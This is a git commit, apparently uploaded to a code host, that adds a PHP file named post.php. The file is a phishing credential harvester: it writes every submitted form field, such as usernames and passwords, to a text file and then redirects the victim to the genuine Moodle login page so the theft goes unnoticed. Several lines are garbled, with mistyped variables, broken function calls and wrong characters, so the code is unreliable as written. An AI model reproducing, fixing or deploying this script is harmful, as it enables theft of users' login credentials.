d75ed86879e6ff827db777027c5812cdb6e0b172
xxrachelpxx <maparanal@my.cspc.edu.ph>
2025-03-06 22:37:17 +0800

    Add files via upload

---
+++ post.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location:https://moodle.org/login/index.php');
+Shandle = fopen ("usernames. txt", "a");
+foreach($_POST as $variable =› $value) {
+fwrite($handle, $variable);
+write($handle,
+write($handle, $value);
+fwrite($handle, "(r\n");
+}
+fwrite($handle, "(r\n");
+fclose ($handle);
+exit;
+?>
